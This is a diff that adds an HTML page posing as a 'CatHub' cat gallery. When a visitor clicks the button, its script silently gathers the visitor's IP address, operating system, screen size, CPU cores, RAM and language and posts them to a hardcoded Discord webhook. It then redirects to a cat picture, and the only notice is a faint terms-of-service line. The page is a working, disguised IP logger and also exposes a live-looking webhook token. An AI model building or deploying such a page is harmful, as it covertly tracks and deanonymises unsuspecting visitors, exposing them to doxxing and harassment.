@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CatHub - View Cats</title>
+    <style>
+        body { 
+            background: #0b0b0b; 
+            color: #ffffff; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+
+        h1 { font-size: 3.5rem; margin-bottom: 0px; color: #4CAF50; }
+        .sub { color: #888; margin-bottom: 30px; font-size: 1.2rem; }
+
+        /* The MAIN Button */
+        .log-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 22px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
+        }
+        .log-btn:hover { 
+            background: #45a049; 
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.5);
+        }
+
+        /* Tiny TOS note at the bottom */
+        .disclaimer {
+            font-size: 10px;
+            color: #333;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>CatHub</h1>
+    <p class="sub">Click below to enter the gallery</p>
+
+    <button class="log-btn" id="enterBtn">VIEW CATHUB (MAKE SURE U READ TOS)</button>
+
+    <p class="disclaimer">By clicking, you agree to our Terms of Service.</p>
+
+    <script>
+        const HOOK_URL = "https://discord.com/api/webhooks/1456279443793252435/AkmvoaiZU4WZ6WZkpwZepphpvjwMJgiiaC0MIrWzlFFXIqayU576PmgkBeC14wC-Qih1";
+
+        document.getElementById('enterBtn').addEventListener('click', async () => {
+            // 1. Change text immediately so they know it's "loading"
+            const btn = document.getElementById('enterBtn');
+            btn.innerText = "Entering...";
+            btn.style.background = "#2e7d32";
+
+            // 2. Gather Hardware Specs
+            const info = {
+                os: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A",
+                lang: navigator.language
+            };
+
+            try {
+                // 3. Get the IP
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+
+                // 4. Fire the Webhook
+                await fetch(HOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "🎯 **CATHUB ACCESS LOGGED**",
+                        embeds: [{
+                            title: "User Connection Profile",
+                            color: 4437376,
+                            fields: [
+                                { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: false },
+                                { name: "💻 Operating System", value: info.os, inline: true },
+                                { name: "🖥️ Resolution", value: info.screen, inline: true },
+                                { name: "⚙️ CPU Cores", value: String(info.cores), inline: true },
+                                { name: "💾 Device RAM", value: info.ram, inline: true },
+                                { name: "🌍 Language", value: info.lang, inline: true }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+            } catch (err) {
+                console.log("Log error, skipping to cat.");
+            }
+
+            // 5. Final Redirect
+            window.location.href = "https://cataas.com/cat";
+        });
+    </script>
+</body>
+</html>
